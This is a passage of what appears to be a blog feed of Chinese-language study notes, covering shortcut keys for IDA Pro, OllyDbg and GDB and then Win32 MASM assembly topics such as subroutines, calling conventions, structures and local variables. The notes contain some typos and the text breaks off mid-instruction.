        <content type="html"><![CDATA[<h2 id="IDA-Pro"><a href="#IDA-Pro" class="headerlink" title="IDA Pro"></a>IDA Pro</h2><ul><li>F5：反编译代码</li><li>Space：切换汇编代码展示方式（流程图or顺序）</li><li>tab：切换反编译窗口和汇编窗口</li><li>n：自定义变量函数名</li><li>y：自定义函数参数、调用方式</li><li>/：添加注释</li><li>x：交叉引用</li><li>shift + E：导出数据</li></ul><h2 id="Olly-DBG"><a href="#Olly-DBG" class="headerlink" title="Olly DBG"></a>Olly DBG</h2><ul><li>F7：步进，跟进函数调用</li><li>F8：步过，不跟进函数调用</li><li>F9：运行直到断点</li><li>F4：执行到光标</li><li>F2：下断点</li><li>ctrl+g：跳转到指定地址</li></ul><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><ul><li>控制流操作<ul><li>r：运行程序</li><li>r&lt;a.txt：重定向输入</li><li>si：步进</li><li>ni：步过</li><li>c：继续运行直到断点</li><li>finish：运行到函数结束</li></ul></li><li>断点<ul><li>b *0xaabb：在指定位置下断点</li><li>b main：在指定函数下断点</li><li>watch *0xaabb：当修改内存时中断</li><li>rwatch *0xaabb：在读取内存时中断</li><li>info b：查看当前断电</li><li>en 1：打开1号断点</li><li>dis 1：关闭1号断点</li></ul></li><li>查看内存<ul><li>x命令查看内存<ul><li>x/16xb 0xaabb<ul><li>查看0xaabb位置的内存，显示为16进制，单位为1字节</li><li>16代表往后数16份单位内存，x代表十进制，b代表byte</li></ul></li><li>x/32dw 0xaabb<ul><li>查看0xaabb位置的内存，显示为10进制整数，单位为2字节</li><li>d代表十进制整数，word代表1个字两个字节</li></ul></li></ul></li></ul></li></ul><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><ul><li>Android\JAVA<ul><li>JEB</li><li>jadx</li><li>xposed\Frida</li></ul></li><li>MIPS<ul><li>JEB</li><li>Ghidra</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>80x86汇编笔记04</title>
      <link href="/2020/03/03/80x86%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F04/"/>
      <url>/2020/03/03/80x86%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F04/</url>
      
        <content type="html"><![CDATA[<h2 id="子程序"><a href="#子程序" class="headerlink" title="子程序"></a>子程序</h2><h3 id="子程序的定义"><a href="#子程序的定义" class="headerlink" title="子程序的定义"></a>子程序的定义</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][参数：类型]...[VARARG]</span><br><span class="line">local局部变量列表</span><br><span class="line">指令</span><br><span class="line">子程序名 endp</span><br></pre></td></tr></table></figure><blockquote><p>[]是可选项</p></blockquote><ul><li><p>距离：可以是NEAR、FAR、NEAR16、NEAR32、FAR16或FAR32，Win32中只有一个平坦的段，无所谓距离，所以对距离的定义往往忽略</p></li><li><p>语言类型：表示参数的使用方式和堆栈平衡的方式，可以是StdCall、C、SysCall、BASIC、FORTRAN和PASCAL，如果忽略，则使用程序头部.model定义的值</p></li><li><p>可视区域：可以是PRIVATE、PUBLIC和EXPORT。默认的设置是PUBLIC</p><ul><li>PRIVATE：表示子程序只对本模块可见</li><li>PUBLIC：表示对所有的模块可见（在最后编译链接完成的exe文件中）</li><li>EXPORT：表示是导出的函数，当编写DLL的时候要将某个函数导出的时候可以这样用</li></ul></li><li><p>USES寄存器列表：表示由编译器在子程序指令开始前自动安排push这些寄存器的指令，并在ret前自动安排pop指令，用于保存执行环境</p></li><li><p>参数和类型：参数指定参数的名称，在定义参数名的时候不能跟全局变量和子程序中的局部变量重名。对于类型由于Win32中的参数类型只有32位一种类型，可以省略。在参数定义的最后还可以跟多个数量不确定的参数，在Win32汇编中唯一使用VARARG的API就是wsprintf</p></li></ul><p>完成了定义之后，可以用invoke伪指令调用，为了让invoke指令能正常使用，必须在程序的头部用proto伪操作定义子程序的信息</p><p>如果先写子程序，再写主程序，就不需要invoke</p><h2 id="参数传递和堆栈平衡"><a href="#参数传递和堆栈平衡" class="headerlink" title="参数传递和堆栈平衡"></a>参数传递和堆栈平衡</h2><p>在调用子程序时，参数的传递是通过堆栈进行的，也就说，调用者要传递给子程序的参数压入堆栈，子程序在堆栈中取出相应的值再使用</p><p>比如要调用：<code>SubRouting(Var1,Var2,Var3)</code>经过编译后的最终代码会是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push Var3</span><br><span class="line">push Var2</span><br><span class="line">push Var1</span><br><span class="line">call SubRouting</span><br><span class="line">add esp,12</span><br></pre></td></tr></table></figure><p>不同的调用规范</p><table><thead><tr><th align="center">语言</th><th align="center">最先入栈参数</th><th align="center">清除堆栈者</th><th align="center">允许使用VARARG</th></tr></thead><tbody><tr><td align="center">C</td><td align="center">右</td><td align="center">调用者</td><td align="center">是</td></tr><tr><td align="center">SysCall</td><td align="center">右</td><td align="center">子程序</td><td align="center">是</td></tr><tr><td align="center">StdCall</td><td align="center">右</td><td align="center">子程序</td><td align="center">是</td></tr><tr><td align="center">BASIC</td><td align="center">左</td><td align="center">子程序</td><td align="center">否</td></tr><tr><td align="center">FORTRAN</td><td align="center">左</td><td align="center">子程序</td><td align="center">否</td></tr><tr><td align="center">PASCAL</td><td align="center">左</td><td align="center">子程序</td><td align="center">否</td></tr></tbody></table><blockquote><p>特殊的是StdCall的对战清楚平时是由子程序完成的，但使用VARARG时是由调用者清除的</p></blockquote><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>数据结构实际上是由多个字段组成的数据样板，相当于一种自定义的数据类型，数据结构中间的每一个字段可以是字节、字、双字、字符串或所有可能的数据类型</p><p>比如在API函数RegisterClass中要使用到一个叫做WNDCLASS的数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typeof struct_WNDCLASS&#123;</span><br><span class="line">    UINTstyle;</span><br><span class="line">    WNDPROClpfnWndProc;</span><br><span class="line">    IntcbClsExtra;</span><br><span class="line">    IntcbWndExtra;</span><br><span class="line">    HINSTANCEhInstance;</span><br><span class="line">    HICONhIcon;</span><br><span class="line">    HCURSORhCursor;</span><br><span class="line">    HBRUSHhbrBackground;</span><br><span class="line">    LPCTSTRlpszMenuName;</span><br><span class="line">    LPCTSTRlpszClassName;</span><br><span class="line">&#125;WNDCLASS.*PWNDCLASS</span><br></pre></td></tr></table></figure><p>这是C语言格式的，在汇编中是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WNDCLASS struct</span><br><span class="line">StyleDWORD?</span><br><span class="line">lpfnWndProcDWORD?</span><br><span class="line">    cbClsExtraDWORD?</span><br><span class="line">    cbWndExtraDWORD?</span><br><span class="line">    hInstanceDWORD?</span><br><span class="line">    hIconDWORD?</span><br><span class="line">    hCursorDWORD?</span><br><span class="line">    hbrBackgroundDWORD?</span><br><span class="line">    lpszMenuNameDWORD?</span><br><span class="line">    lpszClassNameDWORD?</span><br><span class="line">WNDCLASSends</span><br></pre></td></tr></table></figure><p>和大部分的常量一样，几乎所有API所涉及的数据结构在Windows.inc文件中都已经定义了</p><p>定义了数据结构实际上只是定义了一个样板，上面的定义语句并不会在哪个段中产生数据。只是以一个模板的形式存在，今后通过这个样板声明定义结构变量才占用空间</p><p>使用数据结构在数据段中定义数据的方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data?</span><br><span class="line">stWndClassWNDCLASS&lt;&gt;</span><br><span class="line">...</span><br><span class="line">.data</span><br><span class="line">stWndClassWNDCLASS&lt;1,1,1,1,1,1,1,1,1,1&gt;</span><br></pre></td></tr></table></figure><ul><li>第一段的定义方法是未初始化的定义方法</li><li>第二段是在定义的同时指定结构中各字段的初始化值，各字段的初始值用逗号隔开</li></ul><h2 id="数据结构的引用"><a href="#数据结构的引用" class="headerlink" title="数据结构的引用"></a>数据结构的引用</h2><p>在汇编中数据结构的引用方法有好几种，以上面的定义为例，如果要使用stWndClass中的lpfnWndProc字段，最直接的办法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moveax,stWndClass.lpfnWndProc</span><br></pre></td></tr></table></figure><p>在实际使用中，常常有使用指令存取数据结构的情况，如果使用esi寄存器做指针寻址，可以使用下列语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movesi,offset stWndClass</span><br><span class="line">move ax,[esi+WNDCLASS.lpfnWndProc]</span><br></pre></td></tr></table></figure><blockquote><p>注意第二句是<code>move ax,[esi+WNDCLASS.lpfnWndProc]</code>而不是<code>move ax,[esi+stWndClass.lpfnWndProc]</code>，因为前者被编译成<code>mov eax,[esi+4]</code>，而后者被编译成<code>mov eax,[esi+403004h]</code>，后者的结果显然是错误的</p></blockquote><p>MASM中还有一个用法，可以用assume伪指令把寄存器预先定义为结构指针，再进行操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">movesi,offset stWndClass</span><br><span class="line">assumeesi:ptr WNDCLASS</span><br><span class="line">moveaax,[esi].lpfnWndProc</span><br><span class="line">...</span><br><span class="line">assumeesi:nothing</span><br></pre></td></tr></table></figure><blockquote><p>注意：在不再使用esi寄存器做指针的时候要用<code>assume esi:nothing</code>取消定义</p></blockquote><h2 id="结构定义的嵌套"><a href="#结构定义的嵌套" class="headerlink" title="结构定义的嵌套"></a>结构定义的嵌套</h2><p>结构的定义也可以嵌套，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NEW_WNDCLASSstruct</span><br><span class="line">DwOptiondword?</span><br><span class="line">OldWndClassWNDCLASS&lt;&gt;</span><br><span class="line">NEW_WNDCLASSends</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>80x86汇编笔记03</title>
      <link href="/2020/02/27/80x86%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F03/"/>
      <url>/2020/02/27/80x86%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F03/</url>
      
        <content type="html"><![CDATA[<h2 id="标号、变量和数据结构"><a href="#标号、变量和数据结构" class="headerlink" title="标号、变量和数据结构"></a>标号、变量和数据结构</h2><p>当程序中要跳转到另一位置时，需要有一个标识来指示位置，这就是标号，通过在目的地址的前面放一个标号，可以在指令中使用标号来代替直接使用地址</p><p>变量的值在程序运行中是经常改变的，所以它必须定义在可写的段内，如data和data?，或者在堆栈内。按照定义的位置不同，MASM中的变量也分为全局变量和局部变量</p><p>在MASM中标号和变量的命名规范是相同的：</p><ul><li>可以用字母、数字、下划线以及符号@、$和？</li><li>第一个符号不能是数字</li><li>长度不能超过240个字符</li><li>不能使用指令名等关键字</li><li>在作用域内必须是唯一的</li></ul><h2 id="标号的定义"><a href="#标号的定义" class="headerlink" title="标号的定义"></a>标号的定义</h2><p>格式一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">标号名： 目的指令</span><br></pre></td></tr></table></figure><p>格式二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">标号名:: 目的指令</span><br></pre></td></tr></table></figure><p>标号的作用域是当前的子程序，在不同子程序中可以存在同样名字的标号，这也就意味着这种格式不能从一个子程序通过标号跳转到另一个子程序中。如果是在需要从一个子程序中用指令跳转到另一个子程序中的标号位置时候，我们用格式二</p><h2 id><a href="#" class="headerlink" title="@@"></a>@@</h2><p>因为标号有限，我们一般用下面的方式来取标号，节省标号开支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">movcx,1234h</span><br><span class="line">cmp flag,1</span><br><span class="line">je@F；F这里是Forward的意思</span><br><span class="line">movcx,1000h</span><br><span class="line">@@:</span><br><span class="line">lopp @B ;B这里是Before的意思</span><br></pre></td></tr></table></figure><p>当用@@做标号时，@F表示本条指令后的第一个@@标号，@B表示本条指令前的第一个@@标号</p><blockquote><p>当程序中可以有多个@@标号，@B和@F只寻找匹配最近的一个</p></blockquote><p>不要在间隔太远的代码中使用@@符号，距离最好限制在编辑器能够显示的同一屏幕的范围内</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>全局变量的作用域是整个程序，Win32汇编的全局变量定义在data或data？段内，可以同时定义变量的类型和长度，格式如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">变量名类型初始值1，初始值2，……</span><br><span class="line">变量名类型初重复数量 dup(始值1，初始值2，……)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">名称</th><th align="center">表示方式</th><th align="center">缩写</th><th align="center">长度（字节）</th></tr></thead><tbody><tr><td align="center">字节</td><td align="center">byte</td><td align="center">db</td><td align="center">1</td></tr><tr><td align="center">字</td><td align="center">word</td><td align="center">dw</td><td align="center">2</td></tr><tr><td align="center">双字(double word)</td><td align="center">dword</td><td align="center">dd</td><td align="center">4</td></tr><tr><td align="center">三字(far word)</td><td align="center">fword</td><td align="center">df</td><td align="center">6</td></tr><tr><td align="center">四字(quad word)</td><td align="center">qword</td><td align="center">dq</td><td align="center">8</td></tr><tr><td align="center">十字节BCD码(ten byte)</td><td align="center">tbyte</td><td align="center">dt</td><td align="center">10</td></tr><tr><td align="center">有符号字节(sign byte)</td><td align="center">sbyte</td><td align="center"></td><td align="center">1</td></tr><tr><td align="center">有符号子(sign byte)</td><td align="center">sword</td><td align="center"></td><td align="center">2</td></tr><tr><td align="center">有符号双字(sign dword)</td><td align="center">sdword</td><td align="center"></td><td align="center">4</td></tr><tr><td align="center">单精度浮点数</td><td align="center">real4</td><td align="center"></td><td align="center">4</td></tr><tr><td align="center">双精度浮点数</td><td align="center">real8</td><td align="center"></td><td align="center">8</td></tr><tr><td align="center">10字节浮点数</td><td align="center">real10</td><td align="center"></td><td align="center">10</td></tr></tbody></table><blockquote><p>所有使用到变量类型的情况中，只有定义全局变量的时候才可以用缩写</p></blockquote><p>在byte类型变量的定义中，可以用引号定义字符串和数值定义的方法混用</p><p>假设要定义两个字符串Hello,World!和Hello again，每个字符串后面中回车和换行符，最后以一个0字符结尾，可以定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">szTextdb&quot;Hello World!&quot;,0dh,0ah,\</span><br><span class="line">&quot;Hello again&quot;,0dh,0ah,0</span><br></pre></td></tr></table></figure><p>DOS和Windows采用回车+换行(CR/LF)表示下一行，而UNIX/Linux采用换行符(LF)表示下一行，macOS则采用回车符(CR)表示下一行</p><ul><li>CR用符号”\r”表示，十进制ASCII代码是13，十六进制代码为0x0D</li><li>LF使用”\n“符号表示，ASCII代码是10，十六进制为0x0A</li></ul><p>全局变量在定义中既可以指定初值，也可以预留，在data？段中，只能用问号预留空间，在data？段中不能指定初始值</p><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>局部变量这个概念出现以后，两个以上子程序都要用到的数据才被定义为全局变量统一放在数据段中，仅在子程序内部使用的变量则放在堆栈中，这样还可以使得子程序编程黑匣子的模样，使程序的模块结构更加分明</p><p>局部变量的作用域是单个子程序，在进入子程序的时候，通过修改堆栈指针esp来预留出需要的空间，再用ret指令返回主程序之前，同样通过恢复esp丢弃这些空间</p><p>局部变量因为空间是临时分配的，所以无法定义含有初始化值的变量，对局部变量的初始化一般在子程序中由指令完成</p><h4 id="局部变量的定义"><a href="#局部变量的定义" class="headerlink" title="局部变量的定义"></a>局部变量的定义</h4><p>MASM用local伪指令提供了对局部变量的支持，格式是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local 变量名1[[重复数量]][:类型]，变量名2[[重复数量]][:类型]……</span><br></pre></td></tr></table></figure><p>local伪指令必须紧接在子程序定义的伪指令proc后，其它指令开始前，这是因为局部变量的数目必须在子程序开始的时候就确定下来系统才知道如何分配，在一个local语句定义不下的时候，可以有多个local语句，<strong>语法中的数据类型不能用缩写</strong></p><ul><li>Win32汇编默认的类型是dword，如果定义dword类型的局部变量，则类型可以省略</li><li>当定义数组的时候，可以[]括号起来。<strong>不能使用定义全局变量的dup伪指令</strong></li><li>局部变量不能和已定义的全局变量同名</li><li>局部变量的作用域是当前子程序，所以在不同的子程序中可以有同名的局部变量</li></ul><p>一些例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">localloc1[1024]:byte;定义了一个1024字节长的局部变量loc1</span><br><span class="line">localloc2;定义了一个名为loc2的局部变量，类型是默认值dword</span><br><span class="line">localloc3：WNDCLASS;定义了一个WNDCLASS数据结构，名为loc3</span><br></pre></td></tr></table></figure><h4 id="局部变量的使用"><a href="#局部变量的使用" class="headerlink" title="局部变量的使用"></a>局部变量的使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TestProc proc;名为TestProc的子程序</span><br><span class="line">local@loc1:dword,@loc2:word</span><br><span class="line">local@loc3:byte;用local语句定义了3个变量</span><br><span class="line">moveax,@loc1;对应类型进行转储，然后返回</span><br><span class="line">movax,@loc2</span><br><span class="line">moval,@loc3</span><br><span class="line">ret</span><br><span class="line">TestProcendp</span><br></pre></td></tr></table></figure><p>其实在编译后的文件再反汇编的话，可以发现编译器编译后的指令比源程序多了前后两段指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">movebp,esp</span><br><span class="line">addesp,FFFFFFF8</span><br><span class="line">……</span><br><span class="line">leave</span><br></pre></td></tr></table></figure><p>这就是使用局部变量所必须的指令，分别用于局部变量的准备工作和扫尾工作</p><h5 id="分析过程："><a href="#分析过程：" class="headerlink" title="分析过程："></a>分析过程：</h5><ul><li>当调用者执行了call TestProc指令后，CPU把返回的地址（当前地址）压入堆栈，再转移（jmp）到子程序执行</li><li>esp在程序的执行过程中可能随时用到，不可能用esp来随时存取局部变量，ebp寄存器是以堆栈段为默认数据段的，所以，可以用ebp做指针指向堆栈代替esp</li><li>于是，在初始化前，先用一句push ebp指令把原来的ebp保存起来，然后把esp的值传递给ebp</li></ul><p>因为在80386处理器中，以dword(32位)为界对齐时读取内存速度最快，所以MASM宁可浪费一些内存单元进行对齐</p><p>在程序退出前，必须把正确的esp设置回去，否则，ret指令会从堆栈中取出错误的地址返回，因为有<code>mov ebp,esp</code>，所以要返回的时候只要先<code>mov esp,ebp</code>，然后再<code>pop ebp</code>，堆栈就是正确的了</p><p>在80386指令集中有一条指令可以在一句中实现这些功能，就是leave指令，所以，编译器在ret指令之前只使用了一句leave指令</p><p>和全局变量不一样，局部变量的初始值是随机的，是其他子程序执行后在堆栈里留下的垃圾（因为我们知道，腾出空间只是改变栈指针esp），所以，对局部变量的值一定要初始化，特别是定义为结构后当参数传递给API函数的时候</p><h2 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h2><p>在MASM中以不同的类型访问不会对变量造成影响。在MASM中，如果要用指定类型之外的长度访问变量，必须显式地指出要访问地长度，这样编译器忽略语法上的长度检验，仅使用变量地地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类型ptr变量名</span><br></pre></td></tr></table></figure><p>类型可以是byte，word，dword，fword，qword，real8和real10，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movax,wordptrszBuffer</span><br></pre></td></tr></table></figure><blockquote><p>指定类型地参数访问并不会去检测长度是否溢出</p></blockquote><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">bTest1 db 12h</span><br><span class="line">wTest2 dw 1234h</span><br><span class="line">dwTest3 dd 12345678h</span><br><span class="line">……</span><br><span class="line">.code</span><br><span class="line">moval,bTest1</span><br><span class="line">movax,word ptr bTest1</span><br><span class="line">mov eax,dowrd ptr bTest1</span><br></pre></td></tr></table></figure><p><code>mov al,bTest1</code>这一句显然使al等于12h，下面的两句，ax和eax难道等于0012h和00000012h吗？实际运行的结果使3412h和78123412h</p><p>下面是反汇编后的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;.data段中的变量</span><br><span class="line">;.data段中变量是按顺序从低地址往高地址排列的，对于超过一个字节的数据，80386处理器的数据排列方式是小端序</span><br><span class="line">00403000 12 34 12 78 56 34 12</span><br><span class="line">;.code段中的代码</span><br><span class="line">00401000A000304000moval,byteptr [00403000]</span><br><span class="line">0040100566A10030400movax,wordptr [00403000]</span><br><span class="line">0040100BA100304000mov eax,dwordptr [00403000]</span><br></pre></td></tr></table></figure><p>在执行指令<code>mov ax,word ptr bTest1</code>的时候，是从bTest1的地址403000h处取一个字，其长度已经超过了bTest1的范围并落到了wTest2中。从内存中看，是取了bTest1的数据12h和wTest2的低位数据34h，在这两个字节中，12h位于低地址，所以ax中的数值是3412h</p><p>同理，看<code>mov eax,dword ptr bTest1</code>这条指令取了bTest1，wTest2的全部和dwTest3的最低位78h，在内存中的排列是12h 34h 12h 78h，所以eax等于78123412h</p><blockquote><p>这个例子说明了汇编用ptr强制覆盖变量长度的时候，实质上是只用了变量的地址而禁止编译器进行检验。编译器并不会考虑定界的问题，程序员在使用的时候必须对内存中的数据排列有个全局概念，以免越界存取到意料之外的数据</p></blockquote><p>如果只是想把bTest1的一个字节拓展到一个字或一个双字再放到ax或eax中，高位保持0而不是越界存取到其他的变量，80386处理器提供的movzx指令可以实现这个功能，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movzxax,bTest1;ax == 0012h</span><br><span class="line">movzxeax,bTest1;eax == 00000012h</span><br><span class="line">movzxeax,cl;eax == 000000(cl)</span><br><span class="line">movzxeax,ax;eax == 0000(ax)</span><br></pre></td></tr></table></figure><blockquote><p>用movzx指令进行数据长度扩展是Win32汇编中常用技巧</p></blockquote><p>movsx是有符号的数据扩展</p><h2 id="变量的尺寸和数量"><a href="#变量的尺寸和数量" class="headerlink" title="变量的尺寸和数量"></a>变量的尺寸和数量</h2><p>在源程序中用到变量的尺寸和数量的时候，可以用sizeof和lengthof伪指令来实现，格式是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sizeof变量名、数据类型或数据结构名</span><br><span class="line">lengthof变量名</span><br></pre></td></tr></table></figure><p>它们的区别是：</p><ul><li>sizeof伪指令可以取得变量、数据类型或数据结构以字节为单位的长度</li><li>lengthof则可以取得变量中数据的项数</li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stWndClassWNDCALSS &lt;&gt;</span><br><span class="line">szHellodb&apos;Hello,world&apos;,0</span><br><span class="line">dwTestdd1,2,3,4</span><br><span class="line">...</span><br><span class="line">.code</span><br><span class="line">...</span><br><span class="line">moveax,sizeof stWndClass</span><br><span class="line">mov ebx,sizeofWNDCLASS</span><br><span class="line">mov ecx,sizeofszHello</span><br><span class="line">mov edx,sizeofdoword</span><br><span class="line">mov esi,sizeofdwTest</span><br></pre></td></tr></table></figure><ul><li>执行后eax的值是stWndClass结构的长度：40</li><li>ebx同样是：40</li><li>ecx的值是szHello的长度：13</li><li>edx的值是一个双字的长度：4</li></ul><p>如果把所有的sizeof换成lengthof：</p><ul><li>那么eax会等于1，因为只定义了1项WNDCLASS</li><li>ecx同样等于13</li><li>esi则等于4</li><li>lengthof WNDCLASST和lengthof dword是非法的用法，编译器报错</li></ul><p>如果分两行定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">szHellodb&apos;hello&apos;,0dh,0ah</span><br><span class="line">db&apos;world&apos;,0</span><br></pre></td></tr></table></figure><p>sizeof szHello的值是7而不是13.因为MASM中的变量定义只认一行，后一行实际上是另一个没有名称的数据定义</p><h2 id="获取变量地址"><a href="#获取变量地址" class="headerlink" title="获取变量地址"></a>获取变量地址</h2><p>获取变量地址的操作对于全局变量和局部变量是不同的</p><h3 id="全局变量-1"><a href="#全局变量-1" class="headerlink" title="全局变量"></a>全局变量</h3><p>对于全局变量，它的地址在编译的时候已经由编译器确定了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov寄存器，offset 变量名</span><br></pre></td></tr></table></figure><p>其中offset是取变量地址的伪操作符</p><h3 id="局部变量-1"><a href="#局部变量-1" class="headerlink" title="局部变量"></a>局部变量</h3><p>对于局部变量，它是用ebp来做指针操作的，假设ebp的值是40100h，那么第一个局部变量的地址是ebp-4即400FCh</p><p>由于ebp的值随着程序的执行环境不同可能是不同的，所以局部变量的地址值在编译的时候也是不确定的，不能用offset伪操作符来获取它的地址</p><h3 id="取指针的地址"><a href="#取指针的地址" class="headerlink" title="取指针的地址"></a>取指针的地址</h3><p>80386处理器中有一条指令用来获取指针的地址，就是lea指令，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leaeax,[ebp-4]</span><br></pre></td></tr></table></figure><p>该指令可以在运行时按照ebp的值实际计算出地址放到eax中</p><p>如果要在invoke伪指令的参数中用到一个局部变量的地址，MASM对此有一个专用的伪操作符addr，其格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr 局部变量名 或 全局变量名</span><br></pre></td></tr></table></figure><p>当addr后跟全局变量名的时候，用法和offset是相同的</p><p>当addr后面跟局部变量名的时候，编译器自动用lea指令先把地址取到eax中，然后用eax来代替变量地址</p><blockquote><p>addr伪操作符只能在invoke的参数中使用，不能用在类似的场合：</p><p><code>move ax,addr 局部变量名</code></p></blockquote><p>假设在一个子程序中有如下invoke指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invokeTest,eax,addr szHello</span><br></pre></td></tr></table></figure><p>编译器会把invoke伪指令和addr翻译成下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea eax,[ebp-4]</span><br><span class="line">push eax;参数2：addr szHello</span><br><span class="line">push eax;参数1：eax</span><br><span class="line">call 